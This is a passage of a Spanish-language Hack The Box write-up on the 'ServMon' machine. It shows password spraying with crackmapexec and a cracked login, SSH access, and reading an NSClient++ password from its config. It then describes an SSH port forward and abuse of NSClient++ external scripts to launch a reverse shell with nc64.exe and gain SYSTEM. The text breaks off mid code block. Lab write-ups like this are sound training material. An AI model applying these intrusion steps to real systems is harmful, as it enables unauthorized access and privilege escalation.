&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u users.txt -p passwords.txt
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;athan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:L1k3B1gBut7s@W0rk
 œÄ ~/htb/servmon ‚ùØ cme smb 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;nadine&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;L1k3B1gBut7s@W0rk&amp;#39;&lt;/span&gt; --shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span class=&#34;m&#34;&gt;18362&lt;/span&gt; x64 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;name:SERVMON&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;domain:ServMon&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;signing:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; ServMon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine:L1k3B1gBut7s@W0rk
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Enumerated shares
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          Share           Permissions     Remark
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          -----           -----------     ------
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          ADMIN$                          Remote Admin
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          C$                              Default share
SMB         10.10.10.184    &lt;span class=&#34;m&#34;&gt;445&lt;/span&gt;    SERVMON          IPC$            READ            Remote IPC
œÄ ~/htb/servmon ‚ùØ cme ssh 10.10.10.184 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;nadine&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;L1k3B1gBut7s@W0rk&amp;#39;&lt;/span&gt;
SSH         10.10.10.184    &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;     10.10.10.184     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; SSH-2.0-OpenSSH_for_Windows_7.7
SSH         10.10.10.184    &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt;     10.10.10.184     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; nadine:L1k3B1gBut7s@W0rk
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ingresamos por medio de SSH, logramos obtener la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Microsoft Windows &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Version 10.0.18363.752&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;c&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; Microsoft Corporation. All rights reserved.

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;whoami
servmon&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;adine

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;type Desktop&lt;span class=&#34;se&#34;&gt;\u&lt;/span&gt;ser.txt
924e7dffa2f7c2e53e3c9c1bc6211065

nadine@SERVMON C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Realizamos una enumeracion de archivos, y encontramos que existe &lt;code&gt;NSClient++&lt;/code&gt;, tras realizar una busqueda de exploits encontramos que es posible &lt;a href=&#34;https://www.exploit-db.com/exploits/46802&#34;&gt;escalar privilegios&lt;/a&gt; utilizando un archivo .bat, adem√°s un &lt;a href=&#34;https://www.exploit-db.com/exploits/48360&#34;&gt;exploit - Authenticated Remote Code Execution &lt;/a&gt; para ejecutar comandos remotamente.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; dir


    Directory: C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       08/04/2020     23:21                Common Files
d-----       08/04/2020     23:18                Internet Explorer
d-----       19/03/2019     04:52                ModifiableWindowsApps
d-----       16/01/2020     18:11                NSClient++
d-----       08/04/2020     23:09                Reference Assemblies

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verificamos que NSCP estuviera corriendo, adem√°s verificamos en que puerto esta disponible. Tambien verificamos el archivo de configuracion donde encontramos la contrase√±a y vemos que solo estan &amp;ldquo;permitidas conexiones&amp;rdquo; desde &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;adine&amp;gt; Get-Service -Name nscp &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Select-Object *


Name                : nscp
RequiredServices    :
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : True
DisplayName         : NSClient++ Monitoring Agent
DependentServices   :
MachineName         : .
ServiceName         : nscp
ServicesDependedOn  :
ServiceHandle       :
Status              : Running
ServiceType         : Win32OwnProcess
StartType           :
Site                :
Container           :
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; ps &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;findstr &lt;span class=&#34;s2&#34;&gt;&amp;#34;nscp&amp;#34;&lt;/span&gt;
    &lt;span class=&#34;m&#34;&gt;442&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;18976&lt;/span&gt;      &lt;span class=&#34;m&#34;&gt;30632&lt;/span&gt;              &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; nscp
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; netstat -ano &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; findstr &lt;span class=&#34;s2&#34;&gt;&amp;#34;2660&amp;#34;&lt;/span&gt;
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    0.0.0.0:5666           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    0.0.0.0:8443           0.0.0.0:0              LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  TCP    &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:5666              &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;::&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:0                 LISTENING       &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  UDP    0.0.0.0:51512          *:*                                    &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
  UDP    127.0.0.1:51511        *:*                                    &lt;span class=&#34;m&#34;&gt;2660&lt;/span&gt;
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&amp;gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; NSCLIENT++
PS C:&lt;span class=&#34;se&#34;&gt;\P&lt;/span&gt;rogram Files&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;SCLIENT++&amp;gt; cat .&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient.ini
&lt;span class=&#34;c1&#34;&gt;# If you want to fill this file with all available options run the following command:&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   nscp settings --generate --add-defaults --load-all&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# If you want to activate a module and bring in all its options use:&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;#   nscp settings --activate-module &amp;lt;MODULE NAME&amp;gt; --add-defaults&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# For details run: nscp settings --help&lt;/span&gt;


&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; in flight - TODO
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/settings/default&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Undocumented key
&lt;span class=&#34;nv&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; ew2x6SsGTxjRwXOT

&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Undocumented key
allowed &lt;span class=&#34;nv&#34;&gt;hosts&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; 127.0.0.1
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Para realizar la explotacion primero obtuvimos el puerto 8443 localmente utilizando ssh.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras obtener el puerto localmente, obtuvimos la contrase√±a, utilizando nscp.exe.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;rogram files&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient++&amp;gt; .&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;scp.exe web -- password --display
Current password: ew2x6SsGTxjRwXOT
PS C:&lt;span class=&#34;se&#34;&gt;\p&lt;/span&gt;rogram files&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;sclient++&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras analizar el exploit creamos dos archivos, &lt;code&gt;nc64.exe&lt;/code&gt;, para ejecutar una shell inversa que a continuacion se explica de dos &amp;ldquo;formas&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;PS C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&amp;gt; dir

    Directory: C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       14/05/2021     01:39            &lt;span class=&#34;m&#34;&gt;680&lt;/span&gt; exec.bat
-a----       14/05/2021     01:50          &lt;span class=&#34;m&#34;&gt;45272&lt;/span&gt; nc64.exe

PS C:&lt;span class=&#34;se&#34;&gt;\T&lt;/span&gt;emp&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;checkexternalscripts-1&#34;&gt;CheckExternalScripts [1]&lt;/h2&gt;
&lt;p&gt;Para la explotacion creamos un nuevo script en Settings.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_48_23-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Le agregamos un alias, el script o comando a ejecutar y guardamos.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_47_50-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Guardamos los cambios en la opcion &lt;code&gt;Changes&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1319_21_52-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos dirigimos a &lt;code&gt;Modules&lt;/code&gt;, activamos y desactivamos el modulo en el check, esto guardar√° y activar√° los scripts creados.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1302_38_41-Window.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego nos dirigimos a &lt;code&gt;Modulos &amp;gt; CheckExternalScripts &amp;gt; Queries&lt;/code&gt; donde observamos los scripts previamente creados.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_46_43-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;El script que ejecuta el archivo C:\Temp\exec.bat que contiene una shell inversa para powershell no funcion√≥ con esta &amp;ldquo;forma&amp;rdquo;.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Nos dirigimos al querie &lt;code&gt;script_shell&lt;/code&gt; y Run, donde ejecutamos nuestro script.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/servmon/2021-05-1318_51_15-kali-VMwareWorkstation.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego de esto nuestra shell inversa ser√° ejecutada, con lo cual obtenemos una shell &lt;code&gt;nt authority\system&lt;/code&gt; y la flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
